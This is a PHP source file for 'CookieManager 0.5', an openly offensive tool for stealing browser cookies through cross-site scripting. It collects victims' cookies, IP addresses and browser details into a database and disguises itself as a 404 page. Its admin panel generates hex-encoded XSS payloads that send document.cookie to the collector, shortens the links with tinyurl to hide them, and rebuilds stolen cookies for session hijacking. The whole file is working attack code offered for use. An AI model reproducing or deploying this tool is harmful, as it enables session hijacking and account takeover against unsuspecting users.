<?php

// CookieManager 0.5
// (C) Doddy Hackman 2015

//Datos para el login

$username = "admin";
$password = "21232f297a57a5a743894a0e4a801fc3"; //admin

//

//Datos para la DB

$host  = "localhost";
$userw = "root";
$passw = "";
$db    = "cookies";

//


// Functions

function hex_encode($text)
{
    $texto = chunk_split(bin2hex($text), 2, '%');
    return $texto = '%' . substr($texto, 0, strlen($texto) - 1);
}

function parsear_cookie($leyendo)
{
    
    $leyendo   = str_replace("comment=", "", $leyendo);
    $leyendo   = str_replace("Set-Cookie: ", "", $leyendo);
    $contenido = explode(";", $leyendo);
    
    $nombre       = "";
    $valor_cookie = "";
    $expires      = "";
    $path         = "";
    $domain       = "";
    $secure       = "false";
    $httponly     = "false";
    
    foreach ($contenido as $valor) {
        
        if (preg_match("/expires=(.*)/", $valor, $regex)) {
            $expires = $regex[1];
        }
        
        elseif (preg_match("/path=(.*)/", $valor, $regex)) {
            $path = $regex[1];
        } elseif (preg_match("/domain=(.*)/", $valor, $regex)) {
            $domain = $regex[1];
        } elseif (preg_match("/secure=(.*)/", $valor, $regex)) {
            $secure = $regex[1];
        } elseif (preg_match("/httponly=(.*)/", $valor, $regex)) {
            $httponly = $regex[1];
        }
        
        else {
            
            if (preg_match("/(.*)=(.*)/", $valor, $regex)) {
                $nombre       = $regex[1];
                $valor_cookie = $regex[2];
            }
            
        }
        
    }
    
    return array(
        $nombre,
        $valor_cookie,
        $expires,
        $path,
        $domain,
        $secure,
        $httponly
    );
    
}

function ver_cookies_de_pagina($pagina)
{
    $cookies = "";
    if (!function_exists('curl_exec')) {
        $options = array(
            'http' => array(
                'user_agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0'
            )
        );
        $context = stream_context_create($options);
        file_get_contents($pagina);
        foreach ($http_response_header as $valores) {
            if (preg_match("/Set-Cookie/", $valores)) {
                $valores = str_replace("Set-Cookie:", "", $valores);
                $cookies = $cookies . $valores . "<br>";
            }
        }
    } else {
        $nave = curl_init($pagina);
        curl_setopt($nave, CURLOPT_TIMEOUT, 5);
        curl_setopt($nave, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($nave, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0");
        curl_setopt($nave, CURLOPT_HEADER, 1);
        curl_setopt($nave, CURLOPT_NOBODY, 1);
        $contenido = curl_exec($nave);
        curl_close($nave);
        $leyendo = explode("\n", trim($contenido));
        
        foreach ($leyendo as $valores) {
            if (preg_match("/Set-Cookie/", $valores)) {
                $valores = str_replace("Set-Cookie:", "", $valores);
                $cookies = $cookies . $valores . "<br>";
            }
        }
    }
    return $cookies;
}

function toma($target)
{
    $code = "";
    if (function_exists('curl_exec')) {
        $nave = curl_init($target);
        curl_setopt($nave, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0');
        curl_setopt($nave, CURLOPT_TIMEOUT, 5);
        curl_setopt($nave, CURLOPT_RETURNTRANSFER, true);
        $code = curl_exec($nave);
    } else {
        $options = array(
            'http' => array(
                'user_agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0'
            )
        );
        $context = stream_context_create($options);
        $code    = file_get_contents($target);
    }
    return $code;
}

//

error_reporting(0);

mysql_connect($host, $userw, $passw);
mysql_select_db($db);

if (isset($_GET['id'])) {
    
    if (empty($_GET['id'])) {
        error();
    }
    
    $dia = mysql_real_escape_string(date("d.m.Y"));
    $ip  = mysql_real_escape_string($_SERVER["REMOTE_ADDR"]);
    
    if ($ip == "::1") {
        $ip = "127.0.0.1";
    }
    
    $info = mysql_real_escape_string($_SERVER["HTTP_USER_AGENT"]);
    $ref  = mysql_real_escape_string($_SERVER["HTTP_REFERER"]);
    
    $cookie = mysql_real_escape_string($_GET['id']);
    
    mysql_query("INSERT INTO todo(id,fecha,ip,info,cookie) values(NULL,'$dia','$ip','$info','$cookie')");
    
    header("Location:http://www.google.com.ar");
    
}

elseif (isset($_COOKIE['portal'])) {
    
    $st = base64_decode($_COOKIE['portal']);
    
    $plit = explode("@", $st);
    $user = $plit[0];
    $pass = $plit[1];
    
    if ($user == $username and $pass == $password) {
        
        if (isset($_POST['makecookies'])) {
            //setcookie($_POST['name_cookie'],$_POST['value_cookie'],$_POST['expire_cookie'],$_POST['path_cookie'],$_POST['domain_cookie'],$_POST['secure_cookie'],$_POST['httponline_cookie'])) {
            
            if (setcookie($_POST['name_cookie'], $_POST['value_cookie'], time() + 7200, $_POST['path_cookie'], $_POST['domain_cookie'])) {
                echo "<script>alert('Cookies Maked');</script>";
            } else {
                echo "<script>alert('Error making Cookie');</script>";
            }
        }
        
        echo "<title>CookieManager 0.3</title>";
        
        echo "<STYLE type=text/css>

body,a:link {
background-color: #000000;
color:orange;
Courier New;
cursor:crosshair;
font-size: small;
}

input,table.outset,table.bord,table,textarea,select,fieldset,td,tr {
font: normal 10px Verdana, Arial, Helvetica,
sans-serif;
background-color:black;
color:orange; 
border: solid 1px orange;
border-color:orange
}

a:link,a:visited,a:active {
color: orange;
font: normal 10px Verdana, Arial, Helvetica,
sans-serif;
text-decoration: none;
}

</style>
";
        
        $edit_name       = "";
        $edit_value      = "";
        $edit_expire     = "";
        $edit_path       = "";
        $edit_domain     = "";
        $edit_secure     = "";
        $edit_httponline = "";
        
        if (isset($_POST['instalar'])) {
            
            $todo = "create table todo (
id int(10) UNSIGNED NOT NULL AUTO_INCREMENT,
fecha TEXT NOT NULL,
ip TEXT NOT NULL,
info TEXT NOT NULL,
cookie TEXT NOT NULL,
PRIMARY KEY (id));
";
            
            if (mysql_query($todo)) {
                echo "<script>alert('Installed');</script>";
            } else {
                echo "<script>alert('Error');</script>";
            }
        }
        
        if (mysql_num_rows(mysql_query("show tables like 'todo'"))) {
            
            //
            
            if (isset($_GET['del'])) {
                if (is_numeric($_GET['del'])) {
                    if (@mysql_query("delete from todo where id='" . $_GET['del'] . "'")) {
                        echo "<script>alert('Deleted');</script>";
                    } else {
                        echo "<script>alert('Error');</script>";
                    }
                }
            }
            
            echo "<center>";
            echo "<br><h1>CookieManager</h1><br>";
            
            
            // Cookies Found
            
            
            $re  = mysql_query("select * from todo order by id ASC");
            $con = mysql_num_rows($re);
            
            if ($con == 0) {
                echo "<script>alert('Cookies not found');</script>";
            } else {
                
                echo "<table border=1 width=1100><td width=1100><center><h2>Cookies Found : $con</h2></center></table>";
                echo "<table border=1 width=1100>";
                echo "<td><b>ID</b></td><td><b>Date</b></td><td><b>IP</b></td><td><b>Data</b></td><td><b>Cookie</b></td><td><b>Name</b></td><td><b>Value</b></td><td><b>Option</b></td><tr>";
                
                while ($ver = mysql_fetch_array($re)) {
                    $cookies_view = $ver[4];
                    list($nombre, $valor_cookie, $expires, $path, $domain, $secure, $httponly) = parsear_cookie($cookies_view);
                    
                    echo "<td>" . htmlentities($ver[0]) . "</td><td>" . htmlentities($ver[1]) . "</td><td>" . htmlentities($ver[2]) . "</td><td>" . htmlentities($ver[3]) . "</td>";
                    echo "<td>" . htmlentities($cookies_view) . "</td><td>" . htmlentities($nombre) . "</td><td>" . htmlentities($valor_cookie) . "</td><td><a href=?del=" . htmlentities($ver[0]) . ">Del</a></td><tr>";
                    
                }
                
                echo "</table>";
                
            }
            
            //
            
            // Form para target
            
            echo "
<form action='' method=POST>
<center><br><table border=1>
<td><center><h2>Enter Target</h2></center></td><tr>
<td><input type=text size=50 name=target value='http://localhost/dhlabs/xss/index.php?msg='=></td><tr>
<td><input type=submit name=getcookies style='height: 25px; width: 100px' value='Get Cookies'><input type=submit name=generateurl style='height: 25px; width: 100px' value=Generate URL></td>
</table></center>
</form>

";
            
            // URLS
            
            if (isset($_POST['generateurl'])) {
                echo "<br><table border=1>
<td><center><h2>URL Generated</h2></center></td><tr>
<td><textarea cols=50 name=code readonly>\n";
                $script         = hex_encode("<script>document.location='http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?id='+document.cookie;</script>");
                //echo "http://tinyurl.com/api-create.php?url=".$_POST['target'].$script."\n";
                $resultado_code = toma("http://tinyurl.com/api-create.php?url=" . $_POST['target'] . $script);
                echo htmlentities($resultado_code);
                echo "\n</textarea></td></table>";
            }
            //
            
            // Get Cookies 
            
            if (isset($_POST['getcookies'])) {
                echo "<br><table border=1>
<td><center><h2>Console</h2></center></td><tr>
<td><textarea cols=50 rows=10 name=code readonly>\n";
                $resultado_code = ver_cookies_de_pagina($_POST['target']);
                echo htmlentities($resultado_code);
                echo "\n</textarea></td></table>";
                
                $leyendo_esto = split("\n", $resultado_code);
                
                list($nombre, $valor_cookie, $expires, $path, $domain, $secure, $httponly) = parsear_cookie($leyendo_esto[0]);
                
                $edit_name       = $nombre;
                $edit_value      = $valor_cookie;
                $edit_expire     = $expires;
                $edit_path       = $path;
                $edit_domain     = $domain;
                $edit_secure     = $secure;
                $edit_httponline = $httponly;
                
            }
            
            //
            
            // Form para crear cookies
            
            echo "
<form action='' method=POST>
<center><br><table border=1>
<td><center><h2>Cookies Maker</h2></center></td><tr>
<td>Name : <input type=text size=50 name=name_cookie value='$edit_name'=></td><tr>
<td>Value : <input type=text size=50 name=value_cookie value='$edit_value'=></td><tr>
<td>Expires : <input type=text size=50 name=expire_cookie value='$edit_expire'=></td><tr>
<td>Path : <input type=text size=50 name=path_cookie value='$edit_path'=></td><tr>
<td>Domain : <input type=text size=50 name=domain_cookie value='$edit_domain'=></td><tr>
<td>Secure : <input type=text size=50 name=secure_cookie value='$edit_secure'=></td><tr>
<td>HTTP Online : <input type=text size=50 name=httponline_cookie value='$edit_httponline'=></td><tr>
<td><input type=submit name=makecookies style='height: 25px; width: 100px' value='Make Cookies'></td>
</table></center>
</form>";
            
            //
            
            //
            
            echo "<br><h1>(C) Doddy Hackman 2015</h1><br><br>";
            
            //
            
        } else {
            echo "
<center><br><br>
<form action='' method=POST>
<h2>Deseas instalar CookieManager ?</h2><br><br>
<input type=submit name=instalar value=Instalar>
</form>";
        }
        exit(1);
    }
} elseif (isset($_POST['login'])) {
    if ($_POST['user'] == $username and md5($_POST['password']) == $password) {
        setcookie("portal", base64_encode($_POST['user'] . "@" . md5($_POST['password'])));
        echo "<script>alert('Welcome idiot');</script>";
        echo '<meta http-equiv="refresh" content=0;URL=>';
    } else {
        echo "<script>alert('Continued to participate');</script>";
    }
} elseif (isset($_GET['poraca'])) {
    
    echo "

<STYLE type='text/css'>

body,input {
background-color: #000000;
color:orange;
font-family:
Courier New;
cursor:crosshair;
font-size: small;
}
</style>

<h1><br><center><font color=green>Login</font></center></h1>
<br><br><center>
<form action='' method=POST>
Username : <input type=text name=user><br>
Password : <input type=password name=password><br><br>
<input type=submit name=login value=Enter><br>
</form>
</center><br><br>";
} else {
    
    error();
    
}

function error()
{
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>';
    exit(1);
}


mysql_close();

// The End ?


?>